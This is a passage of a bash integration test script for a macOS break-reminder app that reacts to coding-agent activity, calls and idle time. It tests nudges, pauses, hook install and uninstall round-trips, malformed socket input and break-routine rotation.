  expect "after two: the breather" "$(q .nudge.kind)" "breathe"
  dbg advance 11
  expect "left alone, it goes (the third no in a row)" "$(q '.history[-1] | "\(.kind) \(.outcome)"')" "breathe ignored"
  dbg advance 601
  dbg timers 0 4900
  prompt
  expect "ten minutes on: nothing (it used to come back every ten minutes)" "$(q .nudge)" "null"
  expect_match "why not now: spacing out stretches" "$(q .whyNotNow)" "^Spacing out stretches: next one from [0-9]{1,2}:[0-9]{2}"
  dbg advance 2350
  dbg timers 0 7300
  prompt
  expect "just under a cadence: still nothing" "$(q .nudge)" "null"
  dbg advance 60
  dbg timers 0 7400
  prompt
  expect "a cadence after the third no: asked again" "$(q .nudge.kind)" "breathe"
  dbg action decline
  dbg advance 601
  dbg timers 0 8000
  prompt
  expect "a fourth no waits a cadence too: ten minutes on, nothing" "$(q .nudge)" "null"
  expect_match "and why not now says so" "$(q .whyNotNow)" "^Spacing out stretches"
  end_flow
}

flow_away() {
  flow "time away and Undo" away
  dbg timers 1300 3100
  dbg idle 240
  expect "4 min without input: away" "$(q .presence)" "away"
  expect "status reports away" "$(bp status | jq -r .away)" "true"
  dbg input pointer
  expect "back: present" "$(q .presence)" "present"
  expect "both due breaks credited" "$(q '[.history[] | select(.outcome=="credited")] | length')" "2"
  expect "timers reset" "$(q '.timers.screen < 5 and .timers.still < 5')" "true"
  expect_match "away note names the cause" "$(q '.cards[0].text')" "^Counted your 4 min away as a break"
  expect "decision is undoable" "$(q .decision.undoable)" "true"
  expect "cool-down after returning" "$(q '.cooldownUntil != null')" "true"
  dbg action undo
  expect "Undo restores the timers plus the time away" "$(q '.timers.still > 3300')" "true"
  expect "Undo removes the credited entries" "$(q '[.history[] | select(.outcome=="credited")] | length')" "0"
  expect "Timers restored toast" "$(q '.cards[0].text')" "Timers restored"
  expect "decision gone" "$(q .decision)" "null"
  dbg advance 4
  expect "toast hides after 3 s" "$(q '.cards | length')" "0"
  # A 40 s lock resets only the eye timer, silently.
  dbg timers 600 600
  dbg presence locked
  dbg idle 40
  dbg presence unlocked
  dbg input pointer
  expect "short lock resets the eye timer" "$(q '.timers.screen < 5')" "true"
  expect "short lock keeps the move timer" "$(q '.timers.still > 590')" "true"
  expect_match "reset is undoable from the popover line" "$(q .decision.sentence)" "Reset"
  # Idle while video holds a display-sleep assertion is not away.
  dbg input display-sleep on
  dbg idle 400
  expect "display-sleep assertion: idle is not away" "$(q .presence)" "present"
  dbg input display-sleep off
  end_flow
}

flow_calls() {
  flow "call pause" calls
  dbg timers 1250 3050
  dbg call mic
  expect "a microphone just switched on is not a call yet" "$(q .paused)" "null"
  emit agentStarted --source claude-code --session s1
  expect "…but an offer waits while it is on" "$(q '"\(.nudge) \(.held)"')" "null agentStarted"
  expect "…and Why not now says so" "$(q .whyNotNow)" "Holding the nudge: a microphone is on"
  dbg advance 60
  expect "on for a minute: the microphone pauses breaks" "$(q .paused)" "Paused: microphone is on"
  expect "status shows the pause" "$(bp status | jq -r .paused)" "Paused: microphone is on"
  expect "menu bar shows paused" "$(q .menuBar.mark)" "paused"
  emit agentStarted --source claude-code --session s1
  expect "no offer during a call" "$(q .nudge)" "null"
  expect "the call-pause toast appears because a break was due" "$(q '.cards[0].text')" "Breaks paused: microphone is on"
  dbg call both
  expect "camera too" "$(q .paused)" "Paused: microphone and camera are on"
  dbg call none
  expect "call over: not paused" "$(q .paused)" "null"
  emit agentFinished --source claude-code --session s1
  emit agentStarted --source claude-code --session s1
  expect "60 s cool-down after the call" "$(q .nudge)" "null"
  dbg advance 61
  emit agentFinished --source claude-code --session s1
  emit agentStarted --source claude-code --session s1
  expect "after the cool-down: offer" "$(q .nudge.kind)" "move"
  dbg call camera
  expect "a call withdraws the visible nudge" "$(q .nudge)" "null"
  expect "withdrawn records nothing" "$(q '[.history[] | select(.kind=="move")] | length')" "0"
  dbg settings '{"pauseForCamera": false}'
  expect "turning off the camera rule lifts the pause at once" "$(q .paused)" "null"
  dbg call mic
  dbg idle 400
  expect "a call never turns idle into away" "$(q .presence)" "present"
  dbg action resume
  expect "Resume now ignores the current call" "$(q .paused)" "null"
  dbg call none
  dbg action pause 30m
  expect_match "manual pause" "$(q .paused)" "^Paused until"
  dbg action resume
  expect "Resume now" "$(q .paused)" "null"
  end_flow
}

flow_presenting() {
  flow "presenting and watching" presenting
  dbg timers 2000 100                                   # an eye rest well overdue
  dbg input display-sleep on
  dbg advance 30
  expect "a pause in typing offers nothing while the display is kept awake" "$(q .nudge)" "null"
  expect "Why not now names the guard" "$(q .whyNotNow)" "Waiting for an agent run: the display is kept awake"
  expect_match "doctor shows the guard" "$(bp doctor 2>&1)" "Presenting guard: on \(the display is kept awake\)"
  emit agentStarted --source claude-code --session s1
  expect "an agent run still offers, as a plain offer" "$(q '"\(.nudge.kind) \(.nudge.phase)"')" "eyes offer"
  dbg advance 12
  expect "ignored: nothing started by itself" "$(q '"\(.break) \(.history[-1].outcome)"')" "null ignored"
  dbg input display-sleep off
  dbg advance 601
  dbg timers 1250 100                                   # due, below 1.5 × the cadence
  emit agentStarted --source claude-code --session s2
  expect "the guard off: the eye rest counts down" "$(q .nudge.phase)" "autoStartCard"
  dbg input scroll
  expect "scrolling cancels the countdown into an offer" "$(q .nudge.phase)" "offer"
  dbg action decline
  dbg advance 601
  emit agentStarted --source claude-code --session s3
  expect "counting down again" "$(q .nudge.phase)" "autoStartCard"
  dbg input mirrored on
  expect "a display mirrored: the countdown stops" "$(q '"\(.nudge.phase) \(.quiet)"')" "offer displayMirrored"
  dbg action decline
  dbg input mirrored off
  expect "nothing started all along" "$(q '[.history[] | select(.outcome == "completed" or .outcome == "endedEarly")] | length')" "0"
  end_flow
}

flow_dictation() {
  flow "dictation is not a call" dictation
  dbg timers 1250 3050                                  # a stretch is due
  dbg call mic
  dbg advance 5
  emit agentStarted --source claude-code --session s1 --title "dictated prompt"
  expect "the offer waits while the microphone is on" "$(q '"\(.nudge) \(.held) \(.paused) \(.microphoneOnFor)"')" "null agentStarted null 5"
  dbg call none
  dbg advance 1
  expect "the microphone off: the offer comes" "$(q '"\(.nudge.kind) \(.nudge.subtitle)"')" "move Claude is working"
  expect "no pause, no cool-down, no toast" "$(q '"\(.paused) \(.cooldownUntil) \(.cards | length)"')" "null null 0"
  end_flow
}

flow_commands() {
  flow "long shell commands" commands
  dbg timers 1250 3050
  emit commandStarted --source shell --session 4242 --title "vim notes.md"
  dbg advance 25
  expect "interactive commands never offer" "$(q .nudge)" "null"
  emit commandFinished --source shell --session 4242 --title vim
  emit commandStarted --source shell --session 4242 --title "swift test --parallel"
  expect "the command is tracked" "$(bp status | jq -r '.commands[0].command')" "swift"
  dbg advance 19
  expect "not long yet at 19 s" "$(q .nudge)" "null"
  dbg advance 2
  expect "20 s in: a long command offers a break" "$(q .nudge.opportunity)" "longCommand"
  expect "subtitle names the command" "$(q .nudge.subtitle)" "swift is running"
  emit commandFinished --source shell --session 4242 --title swift --exit-code 0
  expect "commandFinished clears it" "$(bp status | jq '.commands | length')" "0"
  end_flow
}

flow_wind_down() {
  flow "wind-down" winddown
  dbg settings '{"windDownEnabled": true, "stopTime": "23:00"}'
  dbg jump 23:20
  emit agentStarted --source claude-code --session s1 --cwd /work/alpha --title "ship the release notes"
  dbg advance 30
  emit agentFinished --source claude-code --session s1
  expect_match "after the stop time a finished run shows the card" "$(q '.cards[] | select(.kind=="windDown") | .text')" "hold 3 s$"
  dbg action wind-down-extend
  expect "15 more minutes closes it" "$(q '[.cards[] | select(.kind=="windDown")] | length')" "0"
  dbg advance 900
  emit agentStarted --source claude-code --session s1 --title "write the changelog"
  dbg advance 10
  emit agentFinished --source claude-code --session s1
  expect_match "the next hold is longer" "$(q '.cards[] | select(.kind=="windDown") | .text')" "hold 6 s$"
  dbg action wind-down-wrap-up
  expect_match "Wrap up shows where you left off" "$(q '.cards[] | select(.kind=="windDown") | .text')" "alpha — write the changelog"
  expect_match "Wrap up pauses until morning" "$(q .paused)" "^Paused"
  end_flow
}

flow_settings() {
  flow "settings take effect at once" settings
  dbg settings '{"eyesEveryMinutes": 10}'
  expect "cadence in the status" "$(bp status | jq -r .cadence.eyesEveryMinutes)" "10"
  expect "saved" "$(jq -r .eyesEveryMinutes "$BREAKPOINT_HOME/Library/Application Support/Breakpoint/settings.json")" "10"
  dbg timers 610 0
  emit agentStarted --source claude-code --session s1
  expect "the new cadence decides the next offer" "$(q .nudge.kind)" "eyes"
  dbg action decline
  dbg settings '{"menuBarText": "timeToNextBreak"}'
  expect "menu-bar text appears" "$(q .menuBar.text)" "due"
  dbg settings '{"autoStartEyes": false}'
  dbg advance 601
  emit agentFinished --source claude-code --session s1
  emit agentStarted --source claude-code --session s1
  expect "auto-start off: a plain offer" "$(q .nudge.phase)" "offer"
  # The AirPods check: off by default, never asks; on: asks once, then reads motion in stretches.
  dbg action decline
  dbg action start move
  dbg advance 121
  expect "check off: no motion read, no prompt" "$(q '[.headphones.begins, .headphones.promptsRequested, .headphones.prepareOn] | @json')" "[0,0,0]"
  dbg settings '{"airpodsMovementCheck": true}'
  expect "turning it on asks once" "$(q .headphones.promptsRequested)" "1"
  dbg advance 5
  expect "and only once" "$(q .headphones.promptsRequested)" "1"
  dbg action start move
  dbg advance 121
  expect "motion read during the stretch" "$(q .headphones.begins)" "1"
  expect "movement detected is recorded" "$(q '.history[-1].movement')" "true"
  # Switched off during a stretch: motion reading still stops when the break ends.
  dbg advance 301
  dbg action start move
  dbg settings '{"airpodsMovementCheck": false}'
  dbg advance 121
  expect "the check ends with the break even if switched off meanwhile" "$(q '[.headphones.begins, .headphones.ends] | @json')" "[2,2]"
  end_flow
}

flow_cursor_relay() {
  flow "relayed Cursor events" relay
  mkdir -p "$BREAKPOINT_HOME/.cursor" "$BREAKPOINT_HOME/.claude"
  CURSOR_VERSION=1.7 "$CLI" emit agentStarted --source claude-code --session r1 --cwd /work/alpha; sleep 0.2
  expect "without Cursor's own hooks a relayed event counts as Cursor" "$(bp status | jq -r '[.sessions[] | select(.sessionID=="r1")][0].source')" "cursor"
  bp install cursor >/dev/null
  CURSOR_VERSION=1.7 "$CLI" emit agentStarted --source claude-code --session r2 --cwd /work/alpha; sleep 0.2
  expect "after \`breakpoint install cursor\` relayed duplicates are dropped" "$(bp status | jq '[.sessions[] | select(.sessionID=="r2")] | length')" "0"
  expect "the tracker knows Cursor's hooks are installed" "$(q .nativeCursorInstalled)" "true"
  bp emit agentStarted --source cursor --session n1 --cwd /work/alpha; sleep 0.2
  expect "native Cursor events still count" "$(bp status | jq '[.sessions[] | select(.sessionID=="n1")] | length')" "1"
  bp uninstall cursor >/dev/null
  dbg action uninstall cursor
  wait_idle_integrations
  CURSOR_VERSION=1.7 "$CLI" emit agentStarted --source claude-code --session r3; sleep 0.2
  expect "after removal they count again" "$(bp status | jq '[.sessions[] | select(.sessionID=="r3")] | length')" "1"
  end_flow
}

flow_malformed() {
  flow "malformed input" malformed
  SOCK="$(find "$BREAKPOINT_HOME" -type s -name '*.sock' | head -1)"
  printf 'not json\n{"v":1}\n{"v":2,"type":"event"}\n{"v":1,"type":"event","event":{"kind":"warpSpeed","source":"x"}}\n' | nc -U -w 1 "$SOCK" >/dev/null 2>&1
  head -c 70000 /dev/zero | tr '\0' 'x' | nc -U -w 1 "$SOCK" >/dev/null 2>&1
  printf '{"v":1,"type":"event","event":{"kind":"agentStarted","source":"claude-code","sessionID":"ok1","ts":1}}\n' | nc -U -w 1 "$SOCK" >/dev/null 2>&1
  sleep 0.3
  expect "garbage, other versions, unknown kinds and oversized lines are dropped; a good line still lands" \
    "$(bp status | jq -c '[.sessions[].sessionID]')" '["ok1"]'
  out="$(echo '{not json' | bp emit agentStarted --source claude-code --stdin-json 2>&1)"; code=$?
  expect "emit with bad stdin is silent and exits 0" "$code:$out" "0:"
  out="$(bp emit 2>&1)"; code=$?
  expect "emit with no arguments is silent and exits 0" "$code:$out" "0:"
  expect "app still answers" "$(bp status >/dev/null && echo up)" "up"
  end_flow
}

flow_integrations() {
  flow "install and uninstall leave files byte-identical" integrations
  H="$BREAKPOINT_HOME"
  mkdir -p "$H/.claude" "$H/.cursor" "$H/.codex" "$H/.copilot" "$H/.gemini" "$H/.config/fish/conf.d"
  printf '{\n  "model": "opus",\n  "hooks": {\n    "Stop": [\n      {\n        "hooks": [\n          {\n            "type": "command",\n            "command": "say done"\n          }\n        ]\n      }\n    ]\n  }\n}\n' > "$H/.claude/settings.json"
  printf '{\n  "version": 1,\n  "hooks": {\n    "stop": [\n      {\n        "command": "./my-hook.sh"\n      }\n    ]\n  }\n}\n' > "$H/.cursor/hooks.json"
  printf 'model = "o3"\n# my notes\n' > "$H/.codex/config.toml"
  printf '{\n  "theme": "dark"\n}\n' > "$H/.gemini/settings.json"
  printf 'export PATH="$HOME/bin:$PATH"\nalias ll="ls -l"\n' > "$H/.zshrc"
  printf '# bash\n' > "$H/.bashrc"
  chmod 600 "$H/.zshrc"
  before="$(sum_files)"
  for tool in claude-code cursor codex copilot gemini shell; do
    bp install "$tool" >/dev/null 2>&1 || fail "breakpoint install $tool"
  done
  [[ "$(sum_files)" != "$before" ]] && pass "breakpoint install changes the files" || fail "breakpoint install changed nothing"
  expect "every tool installed" "$(bp doctor | grep -cE '^ok  (Claude Code|Cursor|Codex CLI|Copilot CLI|Gemini CLI|Shell): ')" "6"
  for tool in claude-code cursor codex copilot gemini shell; do bp uninstall "$tool" >/dev/null 2>&1; done
  expect "breakpoint uninstall restores every file byte for byte" "$(sum_files)" "$before"
  expect "file mode kept" "$(stat -f %Lp "$H/.zshrc")" "600"
  # The same through the app (the Settings and onboarding path, off the main thread).
  for tool in claude-code cursor codex copilot gemini shell; do dbg action install "$tool"; wait_idle_integrations; done
  expect "app installs: all six installed" "$(q '[.integrations | to_entries[] | select(.value.state=="installed")] | length')" "6"
  expect "and each one checked and Connected, with no event from any tool" \
    "$(q '[.integrations | to_entries[] | select(.value.status=="connected(lastEvent: nil)" and .value.connectedAt != null)] | length')" "6"
  expect_match "the Codex trust step is passed to the UI" "$(q '.integrations.codex.notes | join(" ")')" "/hooks"
  expect_match "the shell note is passed to the UI" "$(q '.integrations.shell.notes | join(" ")')" "new terminal"
  # Hand-edited entry → "modified", which offers Remove.
  sed -i '' 's/--stdin-json/--stdin-json --edited/' "$H/.claude/settings.json"
  dbg action open-settings; sleep 0.5
  expect "a hand-edited install reads as modified" "$(q '.integrations["claude-code"].state')" "modified"
  for tool in claude-code cursor codex copilot gemini shell; do dbg action uninstall "$tool"; wait_idle_integrations; done
  expect "app removal (including the edited one) restores every file byte for byte" "$(sum_files)" "$before"
  # Legacy Codex notify: refuses while hooks are installed, round-trips on its own.
  bp install codex-notify >/dev/null 2>&1
  [[ "$(sum_files)" != "$before" ]] && pass "legacy notify installs" || fail "legacy notify did not install"
  bp uninstall codex-notify >/dev/null 2>&1
  expect "legacy notify removal restores config.toml" "$(sum_files)" "$before"
  # A hook command, run the way the tool runs it, reaches the app.
  bp install claude-code >/dev/null 2>&1
  cmd="$(jq -r '.hooks.UserPromptSubmit[].hooks[].command | select(contains("breakpoint"))' "$H/.claude/settings.json")"
  echo '{"session_id":"hook1","cwd":"/work/hooked","prompt":"rename the config loader"}' | HOME="$H" sh -c "$cmd"; sleep 0.3
  expect "the installed UserPromptSubmit hook delivers agentStarted" "$(bp status | jq -r '[.sessions[] | select(.sessionID=="hook1")][0].state')" "working"
  bp uninstall claude-code >/dev/null 2>&1
  expect "and removal still restores the file" "$(sum_files)" "$before"
  end_flow
}

flow_delete_all() {
  flow "Delete all data keeps the integrations ledger" deleteall
  H="$BREAKPOINT_HOME"
  mkdir -p "$H/.claude"; : > "$H/.claude/settings.json"
  before="$(sum_files)"
  dbg timers 1250 3050
  dbg action start eyes; dbg advance 21
  dbg action install claude-code; wait_idle_integrations
  LEDGER="$H/Library/Application Support/Breakpoint/integrations.json"
  expect "the ledger records the empty original" "$([[ -f "$LEDGER" ]] && echo yes)" "yes"
  dbg action delete-all-data
  expect "history deleted" "$(q '.history | length')" "0"
  expect "the ledger is kept" "$([[ -f "$LEDGER" ]] && echo yes)" "yes"
  dbg action uninstall claude-code; wait_idle_integrations
  expect "uninstall after Delete all data restores the empty file" "$(sum_files)" "$before"
  expect "settings.json is empty again" "$(wc -c < "$H/.claude/settings.json" | tr -d ' ')" "0"
  end_flow
}

flow_second_copy() {
  flow "a second copy hands over" second
  "$APP" --debug-headless --debug-simulate > "$BREAKPOINT_HOME/second.log" 2>&1 &
  second=$!
  for _ in $(seq 1 40); do kill -0 $second 2>/dev/null || break; sleep 0.1; done
  if kill -0 $second 2>/dev/null; then kill $second; fail "the second copy quits"; else
    wait $second; expect "the second copy quits quietly (exit 0)" "$?" "0"; fi
  expect_log "the running copy shows itself" "popover shown"
  expect "the running copy keeps the socket" "$(bp status >/dev/null && echo up)" "up"
  end_flow
}

flow_occupied_socket() {
  FLOW="something else at the socket path"; FLOW_FAILED=0
  echo; echo "== $FLOW"
  new_home occupied
  SOCKDIR="$BREAKPOINT_HOME/Library/Application Support/Breakpoint"
  SOCKFILE="$SOCKDIR/breakpoint.sock"
  [[ ${#SOCKFILE} -gt 103 ]] && SOCKFILE="$BREAKPOINT_HOME/.breakpoint/run/bp.sock"
  mkdir -p "$(dirname "$SOCKFILE")"; echo "not a socket" > "$SOCKFILE"
  "$APP" --debug-headless --debug-simulate --debug-trace --quit-after 2 > "$BREAKPOINT_HOME/app.log" 2>&1
  expect "the app keeps running and quits normally (exit 0)" "$?" "0"
  if grep -q "alert: Something other than Breakpoint is in the way" "$BREAKPOINT_HOME/app.log"; then
    pass "the user is told what is in the way"; else fail "no alert recorded"; fi
  expect "the file was left alone" "$(cat "$SOCKFILE")" "not a socket"
}

flow_signals() {
  flow "signal diagnostic" signals
  expect_match "doctor prints the app's signal report" "$(bp doctor 2>&1)" "Idle: .* since any input"
  stop_app
  out="$("$APP" --signals 2>&1)"
  expect_match "--signals prints the real report and exits" "$out" "Microphone in use: (yes|no)"
  expect_match "one line per audio device, no names" "$out" "Audio devices: [0-9]+"
  # A timer preset at launch.
  launch --debug-timers 1199,10
  expect "--debug-timers presets the timers" "$(q '.timers.screen >= 1199 and .timers.screen < 1203')" "true"
  end_flow
}

flow_resume_keeps_needs_you() {
  flow "a later resume card keeps the needs-you" resume
  emit agentStarted --source claude-code --session s1 --cwd /work/alpha
  emit agentStarted --source codex --session c1 --cwd /work/beta
  dbg action start move
  emit agentNeedsUser --source claude-code --session s1 --detail permission_prompt
  dbg advance 4
  dbg action skip
  expect "needs-you resume card after the break" "$(q '.cards[0].text')" "Claude needs you"
  # Away, and meanwhile the other agent finishes: the new card must not drop the needs-you.
  dbg idle 240
  emit agentFinished --source codex --session c1
  dbg input pointer
  expect_match "the needs-you is still on a card" "$(q '[.cards[].text] | join(" | ")')" "needs you"
  dbg advance 15
  expect_match "and it stays until dismissed" "$(q '[.cards[].text] | join(" | ")')" "needs you"
  end_flow
}

flow_routines() {
  flow "routine rotation" routines
  dbg jump 12:00
  # stretch: starts a stretch break, prints its routine, skips it after the guard.
  stretch() { dbg action start move; q .break.routine; dbg advance 4; dbg action skip; }
  expect "the first routine comes first" "$(q .rotation.next)" "neck-and-shoulders"
  dbg action start move
  expect "the first stretch uses the first routine" "$(q .break.routine)" "neck-and-shoulders"
  dbg action extend
  expect "1 more minute replays the routine's own steps" "$(q '.break.steps[4:] | join(", ")')" \
    "Shoulder-blade squeeze, Arms up the wall"
  dbg advance 4; dbg action skip
  dbg settings '{"excludedRoutines": ["wrists-and-forearms"]}'
  expect "an excluded routine is skipped over" "$(q .rotation.next)" "upper-back"
  local seen=("neck-and-shoulders")
  seen+=("$(stretch)" "$(stretch)")
  expect "successive stretches use different routines" "${seen[*]}" "neck-and-shoulders upper-back chest-opener"
  local eyes1 eyes2
  dbg action start eyes; eyes1="$(q .break.title)"; dbg advance 21
  dbg action start eyes; eyes2="$(q .break.title)"; dbg advance 21
  expect "two eye rests in a row show different sentences" "$([[ "$eyes1" != "$eyes2" ]] && echo different)" "different"

  # Relaunch: the rotation and the copy bags were saved.
  launch
  expect "after a relaunch the rotation remembers the last routine" "$(q .rotation.last)" "chest-opener"
  expect "and goes on with the next one" "$(q .rotation.next)" "hips-and-calves"
  expect_true "the eye-rest copy bag survived too" ".rotation.copyLast.eyes != null"
  dbg action start eyes; eyes3="$(q .break.title)"; dbg advance 21
  expect "the first eye rest after the relaunch is not the last one before it" \
    "$([[ "$eyes3" != "$eyes2" ]] && echo different)" "different"
  for _ in 1 2 3 4 5 6 7 8 9 10; do seen+=("$(stretch)"); done
  expect "a full round after the relaunch, in order" "${seen[*]:3:4}" "hips-and-calves stand-and-reach seated-legs neck-and-shoulders"
  local repeats=0 excluded=0 i
  for ((i = 1; i < ${#seen[@]}; i++)); do [[ "${seen[i]}" == "${seen[i-1]}" ]] && repeats=$((repeats + 1)); done
  for r in "${seen[@]}"; do [[ "$r" == "wrists-and-forearms" ]] && excluded=$((excluded + 1)); done
  expect "never the same routine twice in a row (${#seen[@]} stretches)" "$repeats" "0"
  expect "the excluded routine never appears" "$excluded" "0"
  expect "no band routine without a band" "$(printf '%s\n' "${seen[@]}" | grep -c band)" "0"
  dbg settings '{"hasBand": true}'
  expect "with a band, a band routine not done yet comes up next" "$(q .rotation.next)" "band-raises"
  expect "stretches are recorded as usual" "$(q '[.history[] | select(.kind=="move")] | length')" "13"
  dbg action delete-all-data
  expect "Delete all data forgets the rotation" \
    "$(q .rotation.stretchesStarted) $([[ -f "$BREAKPOINT_HOME/Library/Application Support/Breakpoint/rotation.json" ]] && echo kept || echo gone)" "0 gone"
  end_flow
}

flow_pacing() {
  flow "a break you can follow without watching" pacing
  dbg jump 12:00
  ticks() { q '[.sounds[] | select(.=="stepTick")] | length'; }
  completions() { bp debug log | grep -c 'completed: "' ; }
  # A whole stretch, left to run: a soft tick at each of its three step changes.
  dbg action start move
  expect "the first stretch is neck and shoulders" "$(q .break.routine)" "neck-and-shoulders"
  dbg advance 25
  expect "no tick within a step" "$(ticks)" "0"
  dbg advance 8
  expect "a tick when the second step starts" "$(ticks) $(q .break.step)" "1 2/4"
  dbg advance 92
  expect "a tick at every step change, none at the end" "$(ticks)" "3"
  expect "the stretch completed" "$(q '.history[-1] | "\(.kind) \(.outcome)"')" "move completed"
  expect_log "the completed stretch showed its closing moment" 'break move completed: "(That.s two minutes|Shoulders done|Two minutes, done)\."'
  expect "and it is over a moment later" "$(q '[.break, .completion] | @json')" "[null,null]"
  # The next stretch with a call in the middle of it: no tick while the microphone is on.
  dbg action start move
  expect "the second stretch is wrists and forearms (24 s steps)" "$(q .break.routine)" "wrists-and-forearms"
  dbg advance 26
  expect "tick at its first step change" "$(ticks)" "4"
  dbg call mic
  dbg advance 24
  expect "no tick during a call" "$(ticks) $(q .break.step)" "4 3/5"
  dbg call none
  dbg advance 75
  expect "ticks again once the call is over" "$(ticks)" "6"
  # Switched off in Settings: silent.
  dbg settings '{"stepTick": false}'
  dbg action start move
  dbg advance 125
  expect "no tick with the setting off" "$(ticks)" "6"
  dbg settings '{"stepTick": true}'
  # A skipped break and one ended early have no closing moment; Done has one.
  local before; before="$(completions)"
  dbg action start breathe; dbg advance 4; dbg action skip
  expect "a skipped break shows no closing moment" "$(q '.completion') $(completions)" "null $before"
  dbg action start walk
  expect_match "the walk has an idea line" "$(q .break.detail)" "^[A-Z][a-z]+( [a-z]+)*$"
  local idea1; idea1="$(q .break.detail)"
  dbg action finish imBack
  expect "a walk ended early shows no closing moment" "$(q '.completion') $(q '.history[-1].outcome')" "null endedEarly"
  dbg action start walk
  expect "the next walk has a different idea" "$([[ "$(q .break.detail)" != "$idea1" ]] && echo different)" "different"
  dbg action skip; dbg advance 4; dbg action skip
  # Eye rests rotate their tasks (collected from here on; checked below).
  local titles=() i
  dbg action start eyes; titles+=("$(q .break.title)"); dbg advance 17; dbg action finish done
  expect_match "Done shows the closing moment" "$(q '.completion | "\(.kind): \(.line)"')" \
    "^eyes: (That.s twenty seconds|Twenty seconds, done|Eye rest done)\.$"
  expect "the break itself is over" "$(q .break) $(q '.history[-1].outcome')" "null completed"
  dbg action finish done
  expect "Return during the closing moment ends it at once" "$(q .completion)" "null"
  # Every eye-rest variant once before any repeats, never the same twice in a row.
  for i in 1 2 3 4 5 6 7 8; do
    dbg action start eyes; titles+=("$(q .break.title)"); dbg advance 21
  done
  local repeats=0
  for ((i = 1; i < ${#titles[@]}; i++)); do [[ "${titles[i]}" == "${titles[i-1]}" ]] && repeats=$((repeats + 1)); done
  expect "eye-rest variants never repeat back to back (${#titles[@]} rests)" "$repeats" "0"
  expect "a full round of eye-rest variants before any repeats" \
    "$(printf '%s\n' "${titles[@]:0:6}" | sort -u | wc -l | tr -d ' ')" "6"
  end_flow
}

flow_charm() {
  flow "why not now, mark movements and the CLI's face" charm
  dbg jump 12:00
  # "Why not now?" says what the engine is waiting for, in each situation.
  expect "fresh start: nothing due" "$(q .whyNotNow)" "Nothing due: eye rest in 20 min"
  dbg timers 1250 3050
  expect "a stretch due, no agent yet" "$(q .whyNotNow)" "Waiting for an agent run"
  emit sessionStarted --source claude-code --session s1 --cwd /work/alpha
  expect "names the idle agent" "$(q .whyNotNow)" "Waiting for an agent run: Claude is idle"
  # Key first, so no typing pause (8 s quiet at 1.5 × the cadence) can fire in between.
  dbg input key
  dbg timers 1250 4600
  expect "well overdue while typing: waiting for a pause" "$(q .whyNotNow)" "Waiting for a pause: Claude is idle and you are typing"
  emit agentStarted --source claude-code --session s1 --title "add tests"
  expect "the engine holds the opportunity" "$(q .held)" "agentStarted"
  expect "…and the line says so" "$(q .whyNotNow)" "Holding the nudge: you are typing"
  dbg advance 3
  expect "the offer appears" "$(q .nudge.kind)" "move"
  expect "while it shows" "$(q .whyNotNow)" "Offering a break now"
  dbg action decline
  expect_match "after Not now: nudge spacing, with its end" "$(q .whyNotNow)" "^Spacing out nudges: next one from [0-9]{1,2}:[0-9]{2}"
  dbg call mic
  dbg advance 60
  expect "a call: the pause sentence" "$(q .whyNotNow)" "Paused: microphone is on"
  dbg call none
  expect_match "call over: the resume cool-down" "$(q .whyNotNow)" "^Easing back in after a pause: next nudge from "
  # The mark's one-shot movements.
  emit agentFinished --source claude-code --session s1
  expect "a finished run settles the working dot" "$(q '"\(.menuBar.cue.cue) \(.menuBar.badge)"')" "settle none"
  emit agentStarted --source claude-code --session s1
  emit agentNeedsUser --source claude-code --session s1 --detail permission_prompt
  expect "needs you lifts the bars" "$(q '"\(.menuBar.cue.cue) \(.menuBar.badge)"')" "lift needsYou"
  local id; id="$(q .menuBar.cue.id)"
  emit agentStarted --source claude-code --session s1
  emit agentFinished --source claude-code --session s1 --detail interrupted
  expect "an interrupted run is not a finish: no movement" "$(q '"\(.menuBar.cue.id) \(.menuBar.badge)"')" "$id none"
  dbg action wind-down-wrap-up
  expect "Wrap up folds the bars into the rest bar" "$(q '"\(.menuBar.cue.cue) \(.menuBar.mark)"')" "fold paused"
  expect "wrapped up: the pause sentence" "$(q .whyNotNow)" "Paused: wrapped up for tonight"
  expect_log "the trace shows each movement once" "mark movement: settle \\(#1\\)"
  expect "three movements in all" "$(bp debug log | grep -c 'mark movement:')" "3"
  # The command-line tool's face.
  expect_match "--version piped: one plain, parseable line" "$(bp --version)" "^breakpoint [0-9]+\.[0-9]+\.[0-9]+$"
  local tty
  tty="$(TERM=xterm-256color script -q /dev/null "$CLI" --version | tr -d '\r')"
  expect_match "--version in a terminal: the mark in mint beside the version" "$tty" $'\e\\[38;5;79m▄███████████▄'
  expect_match "…with the version on its own" "$tty" "  breakpoint [0-9]+\.[0-9]+\.[0-9]+"
  tty="$(NO_COLOR=1 TERM=xterm-256color script -q /dev/null "$CLI" --version | tr -d '\r')"
  expect "NO_COLOR: the mark without colour" "$([[ "$tty" == *▄███* && "$tty" != *$'\e'* ]] && echo plain)" "plain"
  expect "doctor ends calmly when all is well" "$(bp doctor | tail -1)" "Everything checks out."
  end_flow
}

# emit_json KIND SOURCE JSON [flags…]: a hook payload on stdin, as the installed hooks send it.
emit_json() { local kind="$1" source="$2" json="$3"; shift 3; printf '%s' "$json" | bp emit "$kind" --source "$source" --stdin-json "$@"; sleep 0.15; }

CLAUDE_PROMPT='{"session_id":"s1","cwd":"/work/alpha","hook_event_name":"UserPromptSubmit","prompt":"fix the login redirect"}'
CLAUDE_STOP='{"session_id":"s1","cwd":"/work/alpha","hook_event_name":"Stop","stop_hook_active":false,"last_assistant_message":"## Done\n\nFixed the redirect; all **214** tests pass.\n\n- kept returnTo","background_tasks":[],"session_crons":[]}'

flow_resume_outcome() {
  flow "an agent run that finishes during a break shows its outcome" ro
  emit_json agentStarted claude-code "$CLAUDE_PROMPT"
  dbg advance 170
  dbg action start eyes
  emit_json agentActivity claude-code '{"session_id":"s1","cwd":"/work/alpha","hook_event_name":"PostToolUse","tool_name":"Edit","tool_input":{"file_path":"/work/alpha/a.swift"}}'
  emit_json agentFinished claude-code "$CLAUDE_STOP"
  expect "chip says done" "$(q .break.chip)" "Claude is done. No rush."
  dbg advance 21
  expect "the card says what happened" "$(q '.cards[0].text')" "Claude finished · ran 3 min"
  expect "the supporting line is the agent's last message" "$(q '.cards[0].detail')" "Fixed the redirect; all 214 tests pass."
  expect "the folder is named" "$(q '.cards[0].folder')" "alpha"
  dbg action dismiss all
  # "Keep prompt snippets" off: nothing sensitive travels or shows; the card still says what happened.
  dbg settings '{"storePromptSnippets": false}'
  emit_json agentStarted claude-code "$CLAUDE_PROMPT"
  emit_json agentActivity claude-code '{"session_id":"s1","cwd":"/work/alpha","hook_event_name":"PostToolUse","tool_name":"Edit"}'
